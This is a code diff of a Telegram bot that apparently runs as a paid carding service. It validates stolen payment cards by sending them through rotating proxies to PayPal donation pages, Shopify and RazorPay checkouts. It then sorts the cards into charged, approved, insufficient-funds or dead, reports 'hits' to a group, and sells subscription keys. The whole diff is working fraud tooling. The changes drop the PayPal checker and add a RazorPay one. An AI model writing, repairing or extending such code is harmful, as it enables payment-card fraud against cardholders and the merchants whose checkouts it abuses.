-                return {'status': 'Site Error', 'message': 'PayPal Security Layout Intercepted', 'card': card, 'retry': True}
-
-            url4 = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
-            async with local_session.post(url4, data=payload2, headers=ajax_headers, proxy=proxy_str, timeout=20) as r4:
-                try: j4 = await r4.json()
-                except: return {'status': 'Site Error', 'message': 'Final Layout Refused JSON', 'card': card, 'retry': True}
-
-            text = str(j4).lower()
-
-            if 'insufficient' in text or 'not enough' in text or 'balance' in text or 'funds' in text:
-                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            
-            if '3d' in text or 'secure' in text or 'challenge' in text or 'verification' in text or 'otp' in text:
-                return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            if 'cvv' in text or 'cvc' in text or 'zip' in text or 'approved' in text or 'security code' in text or 'not match' in text:
-                return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            
-            if 'rate_limit' in text or 'unavailable' in text or 'error' in text:
-                return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
-
-            if j4.get("success") == True or 'completed' in text or 'succeeded' in text:
-                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-
-            return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-
-    except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'Connection Timeout', 'card': card, 'retry': True}
-    except Exception:
-        return {'status': 'Site Error', 'message': 'Structural Stream Error', 'card': card, 'retry': True}
-
-async def check_card_api(card, site, proxy, session, gateway_name):
-    try:
-        if len(card.split('|')) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}
-        
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         proxy_param = f"&proxy={proxy_str}" if proxy else ""
-        req_url = f"{CHECKER_API_URL}?cc={card}&site={site}{proxy_param}"
+        req_url = f"{SHOPIFY_API_URL}?cc={card}&site={site}{proxy_param}"
         
         async with session.get(req_url, timeout=90) as resp:
             text_data = await resp.text()
@@ -616,54 +452,93 @@ async def check_card_api(card, site, proxy, session, gateway_name):
             
         rm = str(rj.get('Response', '')).strip()
         pr = rj.get('Price', '-')
-        gt = rj.get('Gateway', gateway_name)
+        gt = rj.get('Gateway', 'Shopify')
         st = str(rj.get('Status', '')).strip().lower()
         rl = rm.lower()
         
-        if is_dead_site_error(rm):
-            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        
-        if 'cloudflare bypass failed' in rl or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed', 'unavailable', 'dead']):
+        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session']):
             return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
 
-        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl or 'not enough' in rl or 'low balance' in rl:
+        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
             return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
 
-        if '3d' in rl or 'secure' in rl or 'challenge' in rl or 'verification' in rl or 'otp' in rl:
+        if '3d' in rl or 'secure' in rl or 'otp' in rl:
             return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip', 'match']): 
+        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
             return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
 
-        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: 
+        if st == 'true' or 'success' in rl or 'charged' in rl or 'completed' in rl: 
             return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
             
         return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        
-    except asyncio.TimeoutError: 
-        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
-    except Exception as e: 
-        return {'status': 'Site Error', 'message': f'Connection dropped: {str(e)[:20]}', 'card': card, 'retry': True}
+    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
+    except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
 
+# 2. RAZORPAY API
+async def check_razorpay_api(card, site, proxy, session):
+    try:
+        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
+        proxy_param = f"&proxy={proxy_str}" if proxy else ""
+        req_url = f"{RAZORPAY_API_URL}?cc={card}&site={site}{proxy_param}"
+        
+        # سعر بوابة Razorpay كما طلبت
+        pr = "10₹"
+        gt = "RazorPay"
+        
+        async with session.get(req_url, timeout=90) as resp:
+            text_data = await resp.text()
+            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
+            try: rj = json.loads(text_data)
+            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
+            
+        rm = str(rj.get('Response', '')).strip()
+        rl = rm.lower()
+        st = rj.get('Status', False)
+        
+        if is_dead_site_error(rm) or 'proxy' in rl or 'timeout' in rl:
+            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
+
+        # ردود Razorpay
+        if st is True or 'success' in rl or 'captured' in rl or 'authorized' in rl: 
+            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
+            
+        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
+            return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
+        if '3d' in rl or 'secure' in rl or 'otp' in rl or 'authentication' in rl:
+            return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
+            
+        if 'risk' in rl or 'declined' in rl or 'failed' in rl:
+            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+            
+        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+        
+    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
+    except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
+
+# Core Checker Function
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
     lr = None; ap = list(proxies) if proxies else []
     for _ in range(max_retries):
         p = random.choice(ap) if ap else None
         
-        if gateway_name == "PayPal":
-            r = await check_paypal_donate_api(card, p)
-            s = "PayPal" 
+        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
+        if not acs: 
+            _SITE_ERRORS_COUNT.clear(); acs = sites
+        s = random.choice(acs) if acs else ""
+        
+        if gateway_name == "Shopify":
+            r = await check_shopify_api(card, s, p, session)
+        elif gateway_name == "RazorPay":
+            r = await check_razorpay_api(card, s, p, session)
         else:
-            acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
-            if not acs: 
-                _SITE_ERRORS_COUNT.clear(); acs = sites
-            s = random.choice(acs)
-            r = await check_card_api(card, s, p, session, gateway_name)
+            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
             
-            if r.get('status') == 'Site Error':
-                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
+        if r.get('status') == 'Site Error':
+            _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
             
         if not r.get('retry'):
-            if gateway_name != "PayPal" and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                 _SITE_ERRORS_COUNT[s] = 0
             return r
         lr = r; await asyncio.sleep(DELAY)
@@ -671,12 +546,12 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
-# ====================== RESULTS FORMATTER ENGINE (STANDARD ASCII CC FORMAT) ======================
+# ====================== RESULTS FORMATTER ENGINE ======================
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
-    ps = sf(f"${str(price).replace('$', '')}") if price and price != "-" else sf("-")
+    ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
     
-    h = f"<b>{CE_STAR} {sf('PAYMENT SUCCEEDED')}</b>"
+    h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
     
     country_code = str(bi.get('country_code', '')).strip()
     flag = get_flag_emoji(country_code) if country_code else "🏳️"
@@ -684,12 +559,12 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     
     return f"""{h}
 
-<b>{CE_STAR} {sf('Card')}:</b> <code>{card}</code>
+<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>
 
-<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
+<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
 
-<b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
-<b>{CE_STAR} {sf('Price')}:</b> <code>{ps}</code>
+<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
+<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>
 
 <b>{CE_GEAR} {sf('Bank Info')}:</b>
  ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>
@@ -697,7 +572,7 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
  ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>
  ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>
 
-<b>{CE_TIME} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
+<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
 async def _send_global_hit(gateway, price, uid, bot, elapsed):
     if not HITS_GROUP_TARGET: return
@@ -706,16 +581,16 @@ async def _send_global_hit(gateway, price, uid, bot, elapsed):
         safe_name = escape_html(sf(user_name))
         plan = await get_user_plan(uid)
         plan_name = plan.title() if plan else "Free"
-        ps = f" {sf(f'${str(price).replace('$', '')}')}" if price and str(price) != "-" else ""
+        ps = f" {sf(f'{str(price)}')}" if price and str(price) != "-" else ""
         
-        h = f"<b>{CE_STAR} {sf('PAYMENT SUCCEEDED')}</b>"
+        h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
         
         text = f"""{h}
 
-<b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>{ps}
-<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
-<b>{CE_TIME} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>
-<b>{CE_STAR} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{sf(plan_name)}</code>)"""
+<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>{ps}
+<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
+<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>
+<b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{sf(plan_name)}</code>)"""
 
         try: cid = int(HITS_GROUP_TARGET)
         except ValueError: cid = HITS_GROUP_TARGET
@@ -727,7 +602,7 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot):
     try:
         bi = await get_bin_info(card.split("|")[0])
         msg = format_card_result(card, gateway, price, bi, elapsed)
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")]]
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
@@ -736,17 +611,20 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
     global _MAINTENANCE_MODE
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
     uid = update.effective_user.id
-    pm = await styled_reply(update, f"<b>{CE_TIME} {sf('Processing file data...')}</b>", use_gif=True)
+    pm = await styled_reply(update, f"<b>{CE_CANDLE} {sf('Processing file data...')}</b>", use_gif=True)
     try:
-        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): return await styled_edit(pm, f"<b>{CE_FIRE} {sf('A process is already active! Please wait for it to finish.')}</b>")
+        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
+            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
         doc = update.message.document
-        if doc.file_size > 3 * 1024 * 1024: return await styled_edit(pm, f"<b>{CE_FIRE} {sf('File too large! (Max 3MB)')}</b>")
+        if doc.file_size > 3 * 1024 * 1024: 
+            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
         if not await force_join_check(update, context): 
             try: await pm.delete()
             except Exception: pass
             return
         db_proxies = await get_all_user_proxies(uid)
-        if len(db_proxies) == 0: return await styled_edit(pm, f"<b>{CE_FIRE} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
+        if len(db_proxies) == 0: 
+            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
         
         f = await context.bot.get_file(doc.file_id)
         fp = f"temp_{uid}_{int(time.time())}.txt"
@@ -760,19 +638,18 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         if os.path.exists(fp): os.remove(fp)
         
         cards = extract_cc(content)
-        if not cards: return await styled_edit(pm, f"<b>{CE_FIRE} {sf('No valid cards found in the file.')}</b>")
+        if not cards: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('No valid cards found in the file.')}</b>")
         
         cl = get_cc_limit(await get_user_plan(uid), uid)
         if len(cards) > cl: cards = cards[:cl]
         PENDING_FILES[uid] = cards
         
         kb = [
-            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("PayPal (1$)"), callback_data="gate:PayPal", style="success")],
-            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("Stripe (Soon)"), callback_data="gate:soon_Stripe", style="primary")],
-            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
+            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify"), InlineKeyboardButton(sf("RazorPay (10₹)"), callback_data="gate:RazorPay")],
+            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel")]
         ]
-        await styled_edit(pm, f"<b>{CE_STAR} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_GEAR} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_ROCKET} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
-    except Exception as e: await styled_edit(pm, f"<b>{CE_FIRE} {sf('Error')}:</b> {sf(str(e))}")
+        await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
+    except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
@@ -797,7 +674,8 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = tokens[1:]
 
     if cmd in ["start", "cmds", "commands"]:
-        if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
+        if _MAINTENANCE_MODE and uid not in ADMIN_ID: 
+            return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
         if not await force_join_check(update, context): return
         await ensure_user(uid)
         plan = await get_user_plan(uid)
@@ -809,29 +687,29 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await ensure_user(uid)
         plan = await get_user_plan(uid)
         limit = get_cc_limit(plan, uid)
-        t = f"""<b>{CE_STAR} {sf('Profile Information')}</b>
+        t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>
 
 ├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>
-├ <b>{CE_FIRE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>
-├ <b>{CE_STAR} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>
+├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>
+├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>
 ╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
         await styled_reply(update, t, use_gif=True)
 
     elif cmd == "plan":
         if not await force_join_check(update, context): return
         cp = await get_user_plan(uid)
-        t = f"<b>{CE_STAR} {sf('VIP Subscription Plans')}</b>\n\n"
+        t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
         for _, pi in PLANS.items():
-            t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
+            t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
         t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
         await styled_reply(update, t, buttons=kb, use_gif=True)
 
     elif cmd == "fb":
         if not await force_join_check(update, context): return
         txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
         if not txt and not update.message.reply_to_message and not getattr(update.message, 'media', None): 
-            return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide a message.')}</b>", use_gif=True)
+            return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a message.')}</b>", use_gif=True)
         if ADMIN_ID:
             try:
                 if update.message.reply_to_message:
@@ -842,7 +720,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
                     await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
             except Exception: pass
-        await styled_reply(update, f"<b>{CE_STAR} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)
+        await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)
 
     elif cmd == "addpxy":
         if not await force_join_check(update, context): return
@@ -859,27 +737,27 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 lines = raw_rep.split()
         else:
             if len(tokens) > 1: lines = args
-            else: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
+            else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
         
-        if not lines: return await styled_reply(update, f"<b>{CE_FIRE} {sf('No proxies found in your message.')}</b>", use_gif=True)
+        if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
         db_p = await get_all_user_proxies(uid)
         eu = {p['proxy_url'] for p in db_p} if db_p else set()
-        if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
+        if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
         parsed = []
         for l in lines:
             px = parse_proxy_format(l)
             if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
-        if not parsed: return await styled_reply(update, f"<b>{CE_FIRE} {sf('All proxies are already added or invalid.')}</b>", use_gif=True)
+        if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added or invalid.')}</b>", use_gif=True)
         parsed = parsed[:100-len(eu)]
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
         c = 0
         for p2 in parsed: await add_proxy_db(uid, p2); c += 1
-        await styled_edit(tm, f"<b>{CE_STAR} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")
+        await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")
 
     elif cmd == "proxy":
         if not await force_join_check(update, context): return
         proxies = await get_all_user_proxies(uid)
-        if not proxies: return await styled_reply(update, f"<b>{CE_FIRE} {sf('You do not have any proxies saved.')}</b>", use_gif=True)
+        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any proxies saved.')}</b>", use_gif=True)
         t = f"<b>{CE_GEAR} {sf('Your Proxies')} ({sf(str(len(proxies)))}/{sf('100')})</b>\n\n"
         for i, p in enumerate(proxies[:30], 1): t += f"<code>{sf(str(i))}.</code> <code>{sf(p['ip'])}:{sf(str(p['port']))}</code>\n"
         if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
@@ -888,35 +766,35 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif cmd == "rmpxy":
         if not await force_join_check(update, context): return
         proxies = await get_all_user_proxies(uid)
-        if not proxies: return await styled_reply(update, f"<b>{CE_FIRE} {sf('No proxies to remove.')}</b>", use_gif=True)
-        if not args: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Specify all or the proxy number.')}</b>", use_gif=True)
+        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
+        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all or the proxy number.')}</b>", use_gif=True)
         arg = args[0].strip().lower()
         if arg == 'all':
             c = await clear_all_proxies(uid)
-            return await styled_reply(update, f"<b>{CE_STAR} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
+            return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
         try:
             idx = int(arg) - 1
             if 0 <= idx < len(proxies): 
                 await remove_proxy_by_index(uid, idx)
-                await styled_reply(update, f"<b>{CE_STAR} {sf('Proxy removed.')}</b>", use_gif=True)
-            else: await styled_reply(update, f"<b>{CE_FIRE} {sf('Invalid proxy number.')}</b>", use_gif=True)
-        except Exception: await styled_reply(update, f"<b>{CE_FIRE} {sf('Invalid proxy number.')}</b>", use_gif=True)
+                await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed.')}</b>", use_gif=True)
+            else: await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid proxy number.')}</b>", use_gif=True)
+        except Exception: await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid proxy number.')}</b>", use_gif=True)
 
     elif cmd == "gen":
         if uid not in ADMIN_ID: return
-        if len(args) < 1: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Syntax')}:</b> <code>/gen [plan] [qty]</code>", use_gif=True)
+        if len(args) < 1: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Syntax')}:</b> <code>/gen [plan] [qty]</code>", use_gif=True)
         pk = args[0].lower()
         amt = int(args[1]) if len(args) > 1 else 1
-        if pk not in PLANS: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
+        if pk not in PLANS: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
         pi = PLANS[pk]
         kdb = await load_keys()
         gc = []
         for _ in range(amt):
-            c = f"Shopify-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
+            c = f"VIP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
             kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
             gc.append(c)
         await save_keys(kdb)
-        t = f"<b>{CE_STAR} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
+        t = f"<b>{CE_PARTY} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
         for c in gc: t += f"<code>{sf(c)}</code>\n"
         await styled_reply(update, t, use_gif=True)
 
@@ -924,11 +802,11 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await force_join_check(update, context): return
         raw_c = args[0].strip() if args else ""
         c = unsf(raw_c)
-        if not c: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide your key:')}</b> <code>/redeem [Key]</code>", use_gif=True)
+        if not c: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide your key:')}</b> <code>/redeem [Key]</code>", use_gif=True)
         kdb = await load_keys()
-        if c not in kdb: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
+        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
         ki = kdb[c]
-        if ki["used"]: return await styled_reply(update, f"<b>{CE_FIRE} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
+        if ki["used"]: return await styled_reply(update, f"<b>{CE_BOOM} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
         t, d = ki["tier"], ki["days"]
         await set_user_plan(uid, t, d)
         kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -940,37 +818,36 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_name = _USER_NAMES.get(uid, f"User {uid}")
         safe_name = escape_html(sf(user_name))
         
-        msg = f"""<b>{CE_STAR} {sf('Subscription Activated Successfully!')}</b>
+        msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>
 
-├ <b>{CE_STAR} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
